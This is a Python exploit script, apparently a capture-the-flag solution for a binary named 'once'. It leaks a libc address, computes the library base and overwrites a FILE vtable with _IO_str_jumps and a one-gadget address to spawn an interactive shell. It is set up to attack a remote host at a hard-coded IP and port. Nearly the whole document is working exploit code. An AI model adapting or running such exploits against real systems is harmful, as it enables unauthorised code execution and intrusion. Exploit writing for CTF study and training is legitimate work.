#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './once'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'47.75.189.102', 'port':9999})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.23.so')
env.select()

#==========

binf = ELF(bin_file)
libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_puts        = libc.sep_function['puts']
offset_libc_onegadget   = 0xcd1c8

#==========

def attack(conn):
    conn.sendlineafter('> ', '0')
    conn.recvuntil('\n')
    addr_libc_puts = int(conn.recv(14), 16)
    libc.address = addr_libc_puts - offset_libc_puts
    addr_libc_onegadget     = libc.address + offset_libc_onegadget
    addr_libc_io_file_jumps = libc.symbols['_IO_file_jumps']
    addr_libc_io_str_jumps  = addr_libc_io_file_jumps + 0xc0
    addr_libc_bss           = libc.sep_section['.bss']
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    conn.sendlineafter('> ', '4')
    conn.sendlineafter('> ', '1')
    conn.sendlineafter('size:\n', str(int(0xe8)))

    conn.sendlineafter('> ', '2')
    conn.send(('\x00'*0x88+p64(addr_libc_bss)).ljust(0xd8, '\x00')+p64(addr_libc_io_str_jumps)+p64(addr_libc_onegadget))

    conn.sendlineafter('> ', '3')
    conn.sendlineafter('> ', '4')

    conn.sendlineafter('> ', '2')
    conn.send('a'*0x18+chr(0x40-0x10))
    conn.sendlineafter('> ', '1')

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
